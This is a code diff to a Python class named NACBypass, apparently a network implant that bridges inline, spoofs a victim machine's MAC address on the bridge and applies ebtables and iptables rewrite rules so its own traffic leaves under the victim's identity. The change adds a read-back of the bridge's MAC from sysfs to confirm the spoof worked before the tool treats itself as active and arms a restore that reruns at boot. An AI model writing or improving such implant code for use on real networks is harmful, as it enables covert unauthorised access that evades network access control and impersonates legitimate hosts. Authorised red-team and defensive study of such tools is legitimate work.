@@ -197,13 +197,27 @@ class NACBypass:
         _run_quiet(f"iptables -D OUTPUT -o {self.upstream} -j DROP")
         _run_quiet(f"iptables -D OUTPUT -o {self.downstream} -j DROP")
 
+    def _bridge_mac(self):
+        """The bridge's current address as the kernel reports it, or None.
+
+        Read from sysfs rather than parsed out of `ip link`: one file,
+        no formatting to follow, and nothing to go wrong on a device
+        where `ip` is missing -- which is one of the cases this exists to
+        notice.
+        """
+        try:
+            with open("/sys/class/net/%s/address" % self.bridge) as handle:
+                return handle.read().strip().lower() or None
+        except OSError:
+            return None
+
     def apply_rewrite_rules(self):
         """Set up ebtables + iptables so the implant can originate traffic."""
         if not self.victim_mac:
             logger.error("Cannot apply rules without victim MAC")
             return
         logger.info("Phase 3 — applying L2/L3 rewrite rules")
-        self._phase = "active"
+        self._phase = "spoofing"
 
         self._go_silent()
 
@@ -220,7 +234,25 @@ class NACBypass:
         _run_quiet(f"ip link set {self.bridge} down")
         _run_quiet(f"ip link set dev {self.bridge} address {self.victim_mac}")
         _run_quiet(f"ip link set {self.bridge} up")
-        logger.info("Bridge MAC spoofed to %s", self.victim_mac)
+        # **Read back, because every command above is `_run_quiet`**, which
+        # discards its exit status: a missing `ip`, a kernel that refuses
+        # the address, an interface that would not come up, all of them
+        # looked like success. `_phase` was set to "active" before the
+        # first of them, and the way out's rung 4 reads that phase as its
+        # one durable statement that the switch has seen the MAC move --
+        # so it would have recorded an irreversible move that never
+        # happened, and armed a restore that re-runs the sequence at
+        # every boot with no outage and no arithmetic. The phase becomes
+        # "active" only if the kernel agrees.
+        if self._bridge_mac() == self.victim_mac:
+            self._phase = "active"
+            logger.info("Bridge MAC spoofed to %s", self.victim_mac)
+        else:
+            logger.error(
+                "The bridge's MAC is %s and not %s, so this implant's "
+                "traffic is not leaving under the host's identity and the "
+                "rewrite rules below describe something that did not "
+                "happen", self._bridge_mac(), self.victim_mac)
 
         # ── ebtables: L2 MAC rewriting ──
         _run_quiet("ebtables -t nat -F")
